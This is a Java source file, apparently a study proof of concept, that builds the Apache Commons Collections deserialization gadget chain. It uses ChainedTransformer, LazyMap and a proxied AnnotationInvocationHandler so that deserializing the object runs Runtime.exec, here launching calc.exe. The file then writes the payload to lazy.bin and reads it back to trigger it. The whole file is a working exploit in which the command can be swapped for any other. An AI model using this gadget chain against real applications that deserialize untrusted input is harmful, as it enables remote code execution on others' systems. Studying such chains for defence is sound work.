package demo.LazyMap;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Annotation;
import java.lang.annotation.Documented;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Lazy2 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class },
                        new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class },
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class },
                        new Object[] {"calc.exe"})
        };
        //create chain
        Transformer transformerChain = new ChainedTransformer(transformers);
        //LazyMap
        HashMap hashMap = new HashMap();
        LazyMap lazyM = (LazyMap) LazyMap.decorate(hashMap, transformerChain);
        //get AnnotationInvocationHandler
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        //get Proxy handler and the handler's  memberValues need to be lazyM
        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Documented.class, lazyM);
        //set the handler for lazyM
        Map proxyLazyM = (Map) Proxy.newProxyInstance(lazyM.getClass().getClassLoader(), lazyM.getClass().getInterfaces(),handler);
        //set the memberValues to proxyLazyM
        Object payload = ctor.newInstance(Documented.class, proxyLazyM);
        //test
        //序列化
        FileOutputStream file = new FileOutputStream("lazy.bin");
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(payload);
        se.close();
        //反序列化
        FileInputStream file1 = new FileInputStream("lazy.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        unse.readObject();
        unse.close();

    }
}
